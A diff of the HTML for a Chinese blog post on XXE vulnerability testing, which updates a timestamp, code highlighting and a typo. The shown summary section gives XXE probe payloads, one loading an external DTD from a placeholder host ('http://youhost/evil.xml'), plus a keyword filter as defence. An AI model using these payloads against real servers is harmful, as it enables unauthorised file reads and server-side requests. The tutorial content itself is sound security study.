@@ -97,7 +97,7 @@
 <meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531035307004.png">
 <meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034396346.png">
 <meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531034282367.png">
-<meta property="og:updated_time" content="2018-07-08T07:55:33.511Z">
+<meta property="og:updated_time" content="2018-07-08T07:56:46.695Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE漏洞理解与测试">
 <meta name="twitter:description" content="为何一直复现不成功远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy) (捣鼓了两天心好痛) （copy 来自 https://lightless.me/archives/Rese">
@@ -516,10 +516,10 @@
 <h3 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h3><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到XML相关的交互过程，以如下步骤判断是否存在漏洞：</p>
 <p>（1）检测XML是否会被解析：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe “this is xxe”&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-<p>如果$shit;变成了”this is xxe”，那就继续第二步。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe “this is xxe”&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果$xxe;变成了”this is xxe”，那就继续第二步。</p>
 <p>（2）检测服务器是否支持外部实体：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM “http://youhost/evil.xml”&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>” encoding=”UTF<span class="number">-8</span>”<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM “http://youhost/evil.xml”&gt;</span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 <p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。</p>
 <p>（3）如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p>
 <p>（4）如果不能回显，毫无疑问，使用Blind XXE攻击方法。</p>
